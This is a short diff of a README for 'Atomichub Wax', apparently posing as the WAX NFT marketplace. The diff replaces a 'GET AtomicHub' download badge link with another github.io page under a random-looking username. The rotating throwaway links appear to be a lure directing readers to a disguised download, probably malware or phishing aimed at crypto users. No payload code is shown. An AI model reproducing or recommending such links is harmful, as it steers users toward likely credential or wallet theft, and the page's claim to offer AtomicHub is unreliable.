@@ -1,6 +1,6 @@
 # Atomichub Wax - WAX NFT Marketplace for Digital Collectibles
 
-[![GET AtomicHub](https://img.shields.io/badge/GET%20%E2%80%94%20AtomicHub-0078D6?style=for-the-badge&logoColor=white)](https://juanhowardbrkq.github.io/.github/atomichub-wax)
+[![GET AtomicHub](https://img.shields.io/badge/GET%20%E2%80%94%20AtomicHub-0078D6?style=for-the-badge&logoColor=white)](https://leonidaskerrxrjg.github.io/.github/atomichub-wax)
 
 ## AtomicHub Marketplace Overview
 
